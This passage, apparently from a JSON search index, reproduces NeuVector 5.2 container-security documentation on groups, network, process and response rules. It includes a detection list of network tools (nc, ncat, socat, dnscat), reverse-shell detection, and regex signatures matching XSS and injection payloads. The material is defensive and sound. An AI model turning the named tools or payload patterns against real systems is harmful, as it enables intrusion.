running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"5.2","tagName":"h3"},{"title":"Custom Group Examples​","type":1,"pageTitle":"Groups","url":"/5.2/policy/groups#custom-group-examples","content":" General Criteria​  To select all containers (either example below will work)  container=∗ service=∗  To select all containers in the namespace 'default' (namespace supported from v2.2)  namespace=default  To select all containers whose service name starts with 'nginx'  service=nginx∗  To select all containers whose service name contains 'etcd'  service=∗etcd∗  To select all containers in the namespace 'apache1' or 'apache2' (hit enter after each entry)  namespace=apache1 namespace=apache2  To select all containers NOT in the namespace 'apache1' and 'apache2' (hit enter after each entry)  namespace!=apache1 namespace!=apache2  To select all containers in the namespace 'apache1~9'  namespace~apache[1-9]  IP Address Criteria​  All external IP addresses  Please use the default group ‘external’ in rules  IP subnet 10.0.0.0/8  address=10.0.0.0/8  IP range  address=10.0.0.0-10.0.0.15  dropbox.com and it's subdomains (hit enter after each entry)  address=dropbox.com address=*.dropbox.com ","version":"5.2","tagName":"h3"},{"title":"Network Rules","type":0,"sectionRef":"#","url":"/5.2/policy/networkrules","content":"","keywords":"","version":"5.2"},{"title":"Policy: Network Rules​","type":1,"pageTitle":"Network Rules","url":"/5.2/policy/networkrules#policy-network-rules","content":" NeuVector automatically creates Network Rules from your running applications in Discover mode. You can also manually add them in any mode, Discover, Monitor, or Protect. Rules can be added or edited from the CLI or REST API.  NeuVector uses a declarative policy which consist of rules which govern allowed and denied application layer connections. NeuVector analyzes and protects based on not only IP address and port, but by determining the actual network behavior based on application protocols. This enables NeuVector to automatically protect any new application containers regardless of IP address and port.  Network rules specify ALLOWED or DENIED behavior for your applications. These rules determine what connections are normal behavior for your services as well as what are violations. You can delete automatically ‘learned’ rules as well as add new rules to your policy.  important Network rules are enforced in the order that they appear in the list, from top to bottom. To re-order the rules, select the rule you want to move, then you will see a 'Move to' box appear at the top, and you can move the selected rule to the position before or after a specified rule.  important If you edit (add, delete, change) rules, your changes are NOT applied until you click the Save button at the top. If you exit this page without deploying your changes, they will be lost.  Adding New RulesAdd a rule using the ‘+’ either below another rule in the right column, or using the button in the lower right.  ID  (Optional) Enter a number. Network rules are initially ordered from lowest to highest, but rule order can be changed by dragging and dropping them in the list.  From  Specify the GROUP from where the connection will originate. Start typing and NeuVector will match any previously discovered groups, as well as any new groups defined.  To  Specify the destination GROUP where these connections are allowed or denied.  Applications  Enter applications for NeuVector to allow or deny. NeuVector understands deep application behavior and will analyze the payload to determine application protocols. Protocols include HTTP, HTTPS, SSL, SSH, DNS, DNCP, NTP, TFTP, ECHO, RTSP, SIP, MySQL, Redis, Zookeeper, Cassandra, MongoDB, PostgresSQL, Kafka, Couchbase, ActiveMQ, ElasticSearch, RabbitMQ, Radius, VoltDB, Consul, Syslog, Etcd, Spark, Apache, Nginx, Jetty, NodeJS, Oracle, MSSQL, Memcached and gRPC.  note To select Any/All, leave this field blank  Ports  If there are specific ports to limit this rule to, enter them here. For ICMP traffic, enter icmp.  note To select Any/All, leave this field blank  Deny/Allow  Indicate whether this rule is to Allow this type of connection, or Deny it.  If Deny is selected, NeuVector will log this as a violation while in Monitor mode, and will block this while in Protect mode. The default action is to Deny a connection (log violation only if in Monitor mode) if no rule matches it.  Don’t forget to Deploy/Update if you make any changes!  ","version":"5.2","tagName":"h3"},{"title":"Egress Control: Allowing Connections to Trusted Internal Services on Other Networks​","type":1,"pageTitle":"Network Rules","url":"/5.2/policy/networkrules#egress-control-allowing-connections-to-trusted-internal-services-on-other-networks","content":" A common use case for customizing rules is to allow a container service to connect to a network outside of the NeuVector managed cluster’s network. In many cases, since NeuVector does not recognize this network it will classify it as an ‘External’ network, even if it is an internal network.  To allow containers to connect to services on other internal networks, first create a group, then a rule for it.  Create a Group. In Policy -&gt; Groups, click to add a new Group. Name the group (e.g. internal) then specify the criteria for the group. For example, specify the DNS name, IP address or address range of the internal services. Save the new group. Create a Rule. In Policy -&gt; Rules, click to add a new rule. Select the group representing the container From which the connections will originate, then the To group (e.g. internal). You can further refine the rule with specific protocols or ports, or leave blank. Make sure the selector is set to Allow (green).  Be sure to click Deploy to save the new rule.  Finally, review the list of rules to make sure the new rule is in the order and priority desired. Rules are applied from top to bottom.  Ingress IP Policy Based on XFF-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"5.2","tagName":"h3"},{"title":"Split Mode Network Protections​","type":1,"pageTitle":"Network Rules","url":"/5.2/policy/networkrules#split-mode-network-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here.  ","version":"5.2","tagName":"h3"},{"title":"Built-In Network Threat Detection​","type":1,"pageTitle":"Network Rules","url":"/5.2/policy/networkrules#built-in-network-threat-detection","content":" NeuVector automatically detects certain network attacks, regardless of protection mode. In Discover and Monitor mode, these threats will be alerted and can be found in Notifications -&gt; Security Events. In Protect mode, these will alerted as well as blocked. Response rules can be created based on threat detection as well.  Note that customized network threat detection can be configured through the WAF rules section.  NeuVector includes the following detections for threats:  Apache Struts RCE attackCipher Overflow attackDetect HTTP negative content-length buffer overflowDetect MySQL access denyDetect SSH version 1, 2 or 3Detect SSL TLS v1.0, v1.1 (requires environment variable to enable)DNS buffer overflow attackDNS flood DDOS attackDNS null type attackDNS tunneling attackDNS zone transfer attackHTTP Slowloris DDOS attackHTTP smuggling attackICMP flood attackICMP tunneling attackIP Teardrop attackKubernetes man-in-the-middle attack per CVE-2020-8554PING death attackSQL injection attackSSL heartbleed attackSYN flood attackTCP small window attackTCP split handshake attackTCP Small MSS attack ","version":"5.2","tagName":"h3"},{"title":"Process Profile Rules","type":0,"sectionRef":"#","url":"/5.2/policy/processrules","content":"","keywords":"","version":"5.2"},{"title":"Policy -> Groups -> Process Profile Rules​","type":1,"pageTitle":"Process Profile Rules","url":"/5.2/policy/processrules#policy---groups---process-profile-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.    Built-in Suspicious Process Detection​  The following built-in detections are automatically enabled in NeuVector.  Process\tDirection\tReported namenmap\toutgoing\tport scanner nc\toutgoing\tnetcat process ncat\toutgoing\tnetcat process netcat\toutgoing\tnetcat process sshd\tincoming\tssh from remote ssh\toutgoing\tssh to remote scp\toutgoing\tsecure copy telnet\toutgoing\ttelnet to remote in.telnetd\tincoming\ttelnet from remote iodine\toutgoing\tdns tunneling iodined\tincoming\tdns tunneling dnscat\toutgoing\tdns tunneling dns2tcpc\toutgoing\tdns tunneling dns2tcpd\tincoming\tdns tunneling socat\toutgoing\trelay process  In addition the following detections are enabled:  docker cproot privilege escalation (user role into root role)tunnel: reverse shell (triggered when stdin and stdout are redirected to the same socket)  Suspicious processes are alerted when in Discover or Monitor mode, and blocked when in Protect mode. Detection applies to containers as well as hosts, with the exception of 'sshd' which is not considered suspicious on hosts. Processes listed above can be added to the Allow List for containers (Groups) including hosts if it should be allowed.  ","version":"5.2","tagName":"h3"},{"title":"Split Mode Process/File Protections​","type":1,"pageTitle":"Process Profile Rules","url":"/5.2/policy/processrules#split-mode-processfile-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"5.2","tagName":"h3"},{"title":"Security Policy Overview","type":0,"sectionRef":"#","url":"/5.2/policy/overview","content":"","keywords":"","version":"5.2"},{"title":"NeuVector Security Policy​","type":1,"pageTitle":"Security Policy Overview","url":"/5.2/policy/overview#neuvector-security-policy","content":" To detect Violations of normal behavior, NeuVector maintains a security Policy which can be managed from the GUI, CLI, CRD, or REST API.  Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential. Be sure you know the main admin login for the imported file before importing. ","version":"5.2","tagName":"h3"},{"title":"Network Threat Signatures","type":0,"sectionRef":"#","url":"/5.2/policy/threats","content":"","keywords":"","version":"5.2"},{"title":"Detecting Network Threats​","type":1,"pageTitle":"Network Threat Signatures","url":"/5.2/policy/threats#detecting-network-threats","content":" NeuVector deep packet inspection can be used to inspect the network packets and payload for attacks such as those in the OWASP Top 10 and those commonly used in Web Application Firewalls (WAFs).  OWASP Signatures​  DLP Sensors can be created to detect OWASP attacks using the following pattern examples. As always, these may need to be tuned for your environment and applications.  img src=javascript /servlet/.*/org.apache. /modules.php?.*name=Wiki.*&lt;script /error/500error.jsp.*et=.*&lt;script /mailman/.*?.*info=.*&lt;script \\x0aReferer\\x3a res\\x3a/C\\x3a /cgi-bin/cgictl?action=setTaskSettings.*settings={\\x22.*taskId= /cgi-bin/cgictl.*scriptName=.*[?&amp;]scriptName=[^&amp;]*?([\\x22\\x27\\x3c\\x3e\\x28\\x29]|script|onload|src)   Here are other simple examples:    Built-In Threat Detection​  NeuVector also has built-in detection of other network threats such as SQL Injection attacks, DDoS (e.g. Ping Death), and tunneling attacks. For SQL injection attacks, NeuVector inspects the network connection (SQL protocol) between the front end and the sql database pod, reducing false positives and increasing accuracy. ","version":"5.2","tagName":"h3"},{"title":"Response Rules","type":0,"sectionRef":"#","url":"/5.2/policy/responserules","content":"","keywords":"","version":"5.2"},{"title":"Policy: Response Rules​","type":1,"pageTitle":"Response Rules","url":"/5.2/policy/responserules#policy-response-rules","content":" Response Rules provide a flexible, customizable rule engine to automate responses to important security events. Triggers can include Security Events, Vulnerability Scan results, CIS Benchmarks, Admission Control events and general Events. Actions include container quarantine, webhooks, and suppression of alerts.    Creating a new Response Rule using the following:  Group. A rule will apply to a Group. Please see the section Run-Time Security Policy -&gt; Groups for more details on Groups and how to create a new one if needed.Category. This is the type of event, such as Security Event, or CVE vulnerability scan result.Criteria. Specify one or more criteria. Each Category will have different criteria which can be applied. For example, by the event name, severity, or minimum number of high CVEs.Action. Select one or more actions. Quarantine will block all network traffic in/out of a container. Webhook requires that a webhook endpoint be defined in Settings -&gt; Configuration. Suppress log will prevent this event from being logged in Notifications.    important All Response Rules are evaluated to determine if they match the condition/criteria. If there are multiple rule matches, each action(s) will be performed. This is different than the behavior of Network Rules, which are evaluated from top to bottom and only the first rule which matches will be executed.  Additional events and actions will continue to be added by NeuVector in future releases.  ","version":"5.2","tagName":"h3"},{"title":"Detailed Configuration for Response Rules​","type":1,"pageTitle":"Response Rules","url":"/5.2/policy/responserules#detailed-configuration-for-response-rules","content":" Response Rules enable automated responses such as quarantine, webhook, and suppress log based on certain security events. Currently, the events which can be defined in the response rule include event logs, security event logs, and CVE (vulnerability scan) and CIS benchmark reports. Response rules are applied in all modes: Discover, Monitor and Protect and the behavior is same for all 3 modes.  Actions from multiple rules will be applied if an event matches multiple rules. Each rule can have multiple actions and multiple match criteria. All actions defined will be applied to containers when events match the response rule criteria. In the case there is a match for Host (not container) events, currently the actions webhook and suppress log are supported.  There are 6 default response rules included with NeuVector which are set to the status ‘disabled,’ one for each category. Users can either modify a default rule to match their requirements or create new ones. Be sure to enable any rules which should be applied.  Response Rule Parameters Matrix​    Using Multiple Criteria in a Single Rule​  The matching logic for multiple criteria in one response rule is:  For different criteria types (e.g. name:Network.Violation, name:Process.Profile.Violation) within a single rule, apply 'and'  Actions​  Quarantine – container is quarantined. Note that Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.Webhook - a webhook log generatedsuppress-log – log is suppressed - both syslog and webhook log  note Quarantine action is not applicable to rule triggered for Host eventsAction and Event parameters are mandatory; other parameters can be empty to match broader conditions.Multiple rules can match for a single log, which can result in multiple actions taken.Each rule can have multiple actions.  Creating a response rule for security event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category as security eventAdd criteria for the event log to be included as matching criteriaSelect actions to be applied Quarantine, Webhook or suppress logEnable statusThe log levels or process names can be used as other matching criteria  Sample rule to quarantine container and send webhook when package is updated in the nv.alpinepython.default container.​    Icons to manage rules - edit, delete, disable and insert new rule below​    Creating a response rule for event logs​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose Event the categoryAdd name of the event log to be included as the matching criteriaSelect actions to be applied - Quarantine, Webhook or suppress logEnable statusThe log Level can be used as other matching criteria  Sample events that can be chosen for a response rule​    Sample criteria for Admission control events​    Creating a response rule for cve-report category (log level and report name as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose a service group name if the rule needs to be applied to a particular service groupChoose category CVE-ReportAdd log level as matching criteria or cve-report typeSelect actions to be applied Quarantine, Webhook or suppress log (quarantine is not applicable for registry scan)Enable status  Sample CVE report types that can be chosen for CVE-Report category response rule​    Quarantine container and send webhook when vulnerability scan results contain more than 5 high level CVE vulnerabilities for that container​    Send a webhook if container contains vulnerability with name cve-2018-12​    Creating response rule for CIS benchmarks (log level and benchmark number as matching criteria)​  Click &quot;insert to top&quot; to insert the rule at the topChoose service group name if rule need to be applied for a particular service groupChoose category BenchmarkAdd log level as matching criteria or benchmark number, e.g. “5.12” Ensure the container's root filesystem is mounted as read onlySelect actions to be applied Quarantine, Webhook and suppress log (quarantine is not applicable Host Docker and Kubenetes benchmark)Enable status    Unquarantine a container by deleting response rule​  You may want to unquarantine a container if it is quarantined by a response ruleDelete the response rule which caused the container to be quarantined, which can be found in the event logSelect the unquarantine option to unquarantine the container after deleting the rule  Viewing the rule id responsible for the container quarantine (in Notifications -&gt; Events)​    Unquarantine option popup when the appropriate response rule is deleted​  Check the box to unquarantine any containers which were quarantined by this rule    Complete list of categoried criteria that can be configured for Response Rules​  Note that some criteria require a value (e.g. cve-high:1, name:D.5.4, level:critical) delimited by a colon, while others are preset and will show in the drop down when you start typing a criteria.  Events​  Container.Start Container.Stop Container.Remove Container.Secured Container.Unsecured Enforcer.Start Enforcer.Join Enforcer.Stop Enforcer.Disconnect Enforcer.Connect Enforcer.Kicked Controller.Start Controller.Join Controller.Leave Controller.Stop Controller.Disconnect Controller.Connect Controller.Lead.Lost Controller.Lead.Elected User.Login User.Logout User.Timeout User.Login.Failed User.Login.Blocked User.Login.Unblocked User.Password.Reset User.Resource.Access.Denied RESTful.Write RESTful.Read Scanner.Join Scanner.Update Scanner.Leave Scan.Failed Scan.Succeeded Docker.CIS.Benchmark.Failed Kubenetes.CIS.Benchmark.Failed License.Update License.Expire License.Remove License.EnforcerLimitReached Admission.Control.Configured // for admission control Admission.Control.ConfigFailed // for admission control ConfigMap.Load // for initial Config ConfigMap.Failed // for initial Config failure Crd.Import // for crd Config import Crd.Remove // for crd Config remove due to k8s miss Crd.Error // for remove error crd Federation.Promote // for multi-clusters Federation.Demote // for multi-clusters Federation.Join // for joint cluster in multi-clusters Federation.Leave // for multi-clusters Federation.Kick // for multi-clusters Federation.Policy.Sync // for multi-clusters Configuration.Import Configuration.Export Configuration.Import.Failed Configuration.Export.Failed Cloud.Scan.Normal // for cloud scan nomal ret Cloud.Scan.Alert // for cloud scan ret with alert Cloud.Scan.Fail // for cloud scan fail Group.Auto.Remove Agent.Memory.Pressure Controller.Memory.Pressure Kubenetes.NeuVector.RBAC Group.Auto.Promote User.Password.Alert   Incidents (Security Event)​  Host.Privilege.Escalation Container.Privilege.Escalation Host.Suspicious.Process Container.Suspicious.Process Container.Quarantined Container.Unquarantined Host.FileAccess.Violation Container.FileAccess.Violation Host.Package.Updated Container.Package.Updated Host.Tunnel.Detected Container.Tunnel.Detected Process.Profile.Violation // container Host.Process.Violation // host   Threats (Security Event)​  TCP.SYN.Flood ICMP.Flood Source.IP.Session.Limit Invalid.Packet.Format IP.Fragment.Teardrop TCP.SYN.With.Data TCP.Split.Handshake TCP.No.Client.Data TCP.Small.Window TCP.SACK.DDoS.With.Small.MSS Ping.Death DNS.Loop.Pointer SSH.Version.1 SSL.Heartbleed SSL.Cipher.Overflow SSL.Version.2or3 SSL.TLS1.0or1.1 HTTP.Negative.Body.Length HTTP.Request.Smuggling HTTP.Request.Slowloris DNS.Stack.Overflow MySQL.Access.Deny DNS.Zone.Transfer ICMP.Tunneling DNS.Type.Null SQL.Injection Apache.Struts.Remote.Code.Execution DNS.Tunneling K8S.externalIPs.MitM   Violations (Security Event)​  Network.Violation   Compliance​  Compliance.Container.Violation Compliance.ContainerFile.Violation Compliance.Host.Violation Compliance.Image.Violation Compliance.ContainerCustomCheck.Violation Compliance.HostCustomCheck.Violation Compliance.Test.Name // D.[1-5].*   CVE-Report​  ContainerScanReport HostScanReport RegistryScanReport PlatformScanReport cve-name cve-high cve-medium   Admission​  Admission.Control.Allowed // for admission control Admission.Control.Violation // for admission control Admission.Control.Denied // for admission control   Dynamically Generated Criteria​  DLP WAF CustomCheckCompliance  ","version":"5.2","tagName":"h3"},{"title":"Release Notes","type":0,"sectionRef":"#","url":"/5.2/releasenotes","content":"Release Notes Here you will find a 